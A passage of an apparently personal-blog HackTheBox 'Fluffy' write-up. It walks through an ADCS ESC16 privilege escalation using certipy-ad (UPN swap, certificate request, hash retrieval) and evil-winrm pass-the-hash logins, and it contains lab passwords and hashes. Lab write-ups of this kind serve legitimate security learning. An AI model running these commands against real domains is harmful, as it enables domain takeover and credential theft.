+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@kali<span style="color:#f92672">]</span> /home/kali/Fluffy/PKINITtools <span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>❯ evil-winrm -i 10.10.11.69 -u <span style="color:#e6db74">&#39;winrm_svc&#39;</span> -H <span style="color:#e6db74">&#39;REDACTED&#39;</span>
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span style="color:#e6db74">`</span>quoting_detection_proc<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">for</span> module Reline
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\w</span>inrm_svc<span style="color:#ae81ff">\D</span>ocuments&gt; cd ../desktop
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\w</span>inrm_svc<span style="color:#ae81ff">\d</span>esktop&gt; ls
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\w</span>inrm_svc<span style="color:#ae81ff">\d</span>esktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-ar---        5/29/2025   7:52 AM             <span style="color:#ae81ff">34</span> user.txt
+</span></span></code></pre></div>
+<h2 class="relative group">ESC16 
+    <div id="esc16" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#esc16" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad find -vulnerable -u ca_svc -hashes <span style="color:#e6db74">&#34;:ca0f4f9e9eb8a092addf53bb03fc98c8&#34;</span> -dc-ip 10.10.11.69
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Certificate Authorities
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    CA Name                             : fluffy-DC01-CA
+</span></span><span style="display:flex;"><span>    DNS Name                            : DC01.fluffy.htb
+</span></span><span style="display:flex;"><span>    Certificate Subject                 : CN<span style="color:#f92672">=</span>fluffy-DC01-CA, DC<span style="color:#f92672">=</span>fluffy, DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
+</span></span><span style="display:flex;"><span>    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
+</span></span><span style="display:flex;"><span>    Certificate Validity End            : 3024-04-17 16:11:16+00:00
+</span></span><span style="display:flex;"><span>    Web Enrollment
+</span></span><span style="display:flex;"><span>      HTTP
+</span></span><span style="display:flex;"><span>        Enabled                         : False
+</span></span><span style="display:flex;"><span>      HTTPS
+</span></span><span style="display:flex;"><span>        Enabled                         : False
+</span></span><span style="display:flex;"><span>    User Specified SAN                  : Disabled
+</span></span><span style="display:flex;"><span>    Request Disposition                 : Issue
+</span></span><span style="display:flex;"><span>    Enforce Encryption <span style="color:#66d9ef">for</span> Requests     : Enabled
+</span></span><span style="display:flex;"><span>    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+</span></span><span style="display:flex;"><span>    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
+</span></span><span style="display:flex;"><span>    Permissions
+</span></span><span style="display:flex;"><span>      Owner                             : FLUFFY.HTB<span style="color:#ae81ff">\A</span>dministrators
+</span></span><span style="display:flex;"><span>      Access Rights
+</span></span><span style="display:flex;"><span>        ManageCa                        : FLUFFY.HTB<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          FLUFFY.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>                                          FLUFFY.HTB<span style="color:#ae81ff">\A</span>dministrators
+</span></span><span style="display:flex;"><span>        ManageCertificates              : FLUFFY.HTB<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          FLUFFY.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>                                          FLUFFY.HTB<span style="color:#ae81ff">\A</span>dministrators
+</span></span><span style="display:flex;"><span>        Enroll                          : FLUFFY.HTB<span style="color:#ae81ff">\C</span>ert Publishers
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Vulnerabilities
+</span></span><span style="display:flex;"><span>      ESC16                             : Security Extension is disabled.
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Remarks
+</span></span><span style="display:flex;"><span>      ESC16                             : Other prerequisites may be required <span style="color:#66d9ef">for</span> this to be exploitable. See the wiki <span style="color:#66d9ef">for</span> more details.
+</span></span><span style="display:flex;"><span>Certificate Templates                   : <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Could not find any certificate templates
+</span></span></code></pre></div><p>ESC(ID) is a way of identifying different vulnerabilities within ADCS. There is a great github page
+<a
+  href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation"
+    target="_blank"
+  >HERE</a> that goes in depth into each ESC, how it works and how to exploit it.</p>
+<p>First, we read the UPN of <code>ca_svc</code> with our user <code>p.agila</code> (GenericWrite)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad account -u <span style="color:#e6db74">&#39;p.agila@fluffy.htb&#39;</span> -p <span style="color:#e6db74">&#39;prometheusx-303&#39;</span> -dc-ip 10.10.11.69 -user <span style="color:#e6db74">&#39;ca_svc&#39;</span> read
+</span></span><span style="display:flex;"><span>Certipy v5.0.3 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reading attributes <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;ca_svc&#39;</span>:
+</span></span><span style="display:flex;"><span>    cn                                  : certificate authority service
+</span></span><span style="display:flex;"><span>    distinguishedName                   : CN<span style="color:#f92672">=</span>certificate authority service,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>fluffy,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    name                                : certificate authority service
+</span></span><span style="display:flex;"><span>    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
+</span></span><span style="display:flex;"><span>    sAMAccountName                      : ca_svc
+</span></span><span style="display:flex;"><span>    servicePrincipalName                : ADCS/ca.fluffy.htb
+</span></span><span style="display:flex;"><span>    userPrincipalName                   : ca_svc@fluffy.htb
+</span></span><span style="display:flex;"><span>    userAccountControl                  : <span style="color:#ae81ff">66048</span>
+</span></span><span style="display:flex;"><span>    whenCreated                         : 2025-04-17T16:07:50+00:00
+</span></span><span style="display:flex;"><span>    whenChanged                         : 2025-09-17T17:43:15+00:00
+</span></span></code></pre></div><p>Then change the UPN to <code>administrator</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad account -u <span style="color:#e6db74">&#39;p.agila@fluffy.htb&#39;</span> -p <span style="color:#e6db74">&#39;prometheusx-303&#39;</span> -dc-ip 10.10.11.69 -upn <span style="color:#e6db74">&#39;administrator&#39;</span> -user <span style="color:#e6db74">&#39;ca_svc&#39;</span> update
+</span></span><span style="display:flex;"><span>Certipy v5.0.3 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Updating user <span style="color:#e6db74">&#39;ca_svc&#39;</span>:
+</span></span><span style="display:flex;"><span>    userPrincipalName                   : administrator
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully updated <span style="color:#e6db74">&#39;ca_svc&#39;</span>
+</span></span></code></pre></div><p>From our <strong>Shadow Credential</strong> attack from before, export the ..cache file we got so we can use the ticket in the future</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>/home/kali/htb/fluffy/ca_svc.ccache      
+</span></span><span style="display:flex;"><span>                                                                            
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/fluffy<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ klist
+</span></span><span style="display:flex;"><span>Ticket cache: FILE:/home/kali/htb/fluffy/ca_svc.ccache
+</span></span><span style="display:flex;"><span>Default principal: ca_svc@FLUFFY.HTB
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Valid starting       Expires              Service principal
+</span></span><span style="display:flex;"><span>09/17/2025 17:43:15  09/18/2025 03:43:15  krbtgt/FLUFFY.HTB@FLUFFY.HTB
+</span></span><span style="display:flex;"><span>        renew <span style="color:#66d9ef">until</span> 09/18/2025 17:42:08
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>faketime <span style="color:#e6db74">&#39;2025-09-17 18:01:24&#39;</span> certipy-ad req -k -dc-ip 10.10.11.69 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template <span style="color:#e6db74">&#39;User&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> DC host <span style="color:#f92672">(</span>-dc-host<span style="color:#f92672">)</span> not specified and Kerberos authentication is used. This might fail
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting certificate via RPC
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Request ID is <span style="color:#ae81ff">15</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully requested certificate
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got certificate with UPN <span style="color:#e6db74">&#39;administrator&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate has no object SID
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Try using -sid to set the object SID or see the wiki <span style="color:#66d9ef">for</span> more details
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving certificate and private key to <span style="color:#e6db74">&#39;administrator.pfx&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Wrote certificate and private key to <span style="color:#e6db74">&#39;administrator.pfx&#39;</span>
+</span></span></code></pre></div><p>Then we need to revert the UPN back to the original</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad account -u <span style="color:#e6db74">&#39;p.agila@fluffy.htb&#39;</span> -p <span style="color:#e6db74">&#39;prometheusx-303&#39;</span> -dc-ip 10.10.11.69 -upn <span style="color:#e6db74">&#39;ca_svc@fluffy.htb&#39;</span> -user <span style="color:#e6db74">&#39;ca_svc&#39;</span> update
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Updating user <span style="color:#e6db74">&#39;ca_svc&#39;</span>:
+</span></span><span style="display:flex;"><span>    userPrincipalName                   : ca_svc@fluffy.htb
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully updated <span style="color:#e6db74">&#39;ca_svc&#39;</span>
+</span></span></code></pre></div>
+<h2 class="relative group">root.txt 
+    <div id="roottxt" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#roottxt" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>faketime <span style="color:#e6db74">&#39;2025-09-17 18:01:24&#39;</span> certipy-ad auth -dc-ip 10.10.11.69 -pfx administrator.pfx -username <span style="color:#e6db74">&#39;administrator&#39;</span> -domain fluffy.htb
+</span></span><span style="display:flex;"><span>Certipy v5.0.3 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate identities:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     SAN UPN: <span style="color:#e6db74">&#39;administrator&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using principal: <span style="color:#e6db74">&#39;administrator@fluffy.htb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to get TGT...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got TGT
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving credential cache to <span style="color:#e6db74">&#39;administrator.ccache&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Wrote credential cache to <span style="color:#e6db74">&#39;administrator.ccache&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to retrieve NT hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;administrator&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;administrator@fluffy.htb&#39;</span>: REDACTED
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i 10.10.11.69 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span style="color:#e6db74">`</span>quoting_detection_proc<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">for</span> module Reline                        
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                   
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; cd ..
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator&gt; cd desktop
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\d</span>esktop&gt; dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\d</span>esktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-ar---        9/16/2025   8:08 PM             <span style="color:#ae81ff">34</span> root.txt
+</span></span></code></pre></div>
+<h2 class="relative group">New attack methods learned 
+    <div id="new-attack-methods-learned" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#new-attack-methods-learned" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<ul>
+<li>ADCS ESC16 attack chain</li>
+<li>NTLM relay with malicious .zip file via CVE-2025-24071</li>
+</ul>
+
+<h2 class="relative group">Possible Remediations 
+    <div id="possible-remediations" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#possible-remediations" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<ul>
+<li>Apply vendor patches for ADCS services and keep PKI components fully updated</li>
+<li>Restrict certificate template permissions and regularly audit ADCS configurations to prevent abuse</li>
+</ul>
+
+          
+          
+          
+        </div>
+        
+        
+
+        
+  
+  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
+    
+      
+    
+  </section>
+
+
+        
+  
+  
+    <h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2>
+    <section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
+      
+        
+<div
+  class="group-hover-card group relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
+  <a
+    
+  href="/writeups/vulnlab-breach/"
+    class="absolute inset-0"
+    aria-label="Vulnlab-Breach"></a>
+      
+    
+  <div class="px-6 py-4">
+    
+      <div
+        class="group-hover-card-title decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 group-hover:underline group-hover:underline-offset-2">
+        Vulnlab-Breach
+      </div>
+    
+    <div class="group-hover-cancel text-sm text-neutral-500 dark:text-neutral-400">
+      
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <span>2375 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">12 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+            
+              <a class="relative mt-[0.5rem] me-2" href="/categories/writeups/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Writeups
+  </span>
+</span>
+
+              </a>
+            
+          
+        
+      
+        
+      
+        
+          
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/mssql/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Mssql
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/windows/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Windows
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/active-directory/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Active Directory
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/av/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    AV
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/potato/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Potato
+  </span>
+</span>
+
+              </a>
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+    </div>
+    
+  </div>
+  <div class="px-6 pt-4 pb-2"></div>
+</div>
+
+      
+    </section>
+  
+
+
+      </div>
+
+      
+      
+        
+        
+          
+          
+        
+        
+        
+        <script
+          type="text/javascript"
+          src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
+          integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
+          data-oid="views_writeups/htb-fluffy.md"
+          data-oid-likes="likes_writeups/htb-fluffy.md"></script>
+      
+    </section>
+
+    
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/writeups/vulnlab-breach/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Vulnlab-Breach</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="flex text-right group ml-3" href="/writeups/htb-authority/">
+              <span class="flex flex-col">
+                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HackTheBox-Authority</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0 z-10">
+  <a
+    href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+      
+      
+        
+      
+      
+      
+      
+      <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400 overflow-x-auto py-2">
+        <ul class="flex list-none flex-row">
+          
+            <li class=" flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0 ltr:mr-4 rtl:ml-4">
+              <a
+                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
+                href=""
+                title="">
+                
+                
+              </a>
+            </li>
+          
+        </ul>
+      </nav>
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          &copy;
+          2025
+          BeejaySec
+      </p>
+    
+
+    
+    
+  </div>
+  
+    <script>
+      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+        margin: 24,
+        background: "rgba(0,0,0,0.5)",
+        scrollOffset: 0,
+      });
+    </script>
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
+    integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+    <a rel="me" href="https://masto.ai/@blowfish"></a>
+
+  
+  <script src="/js/copy.js"></script>
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="https://localhost:1313/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)">
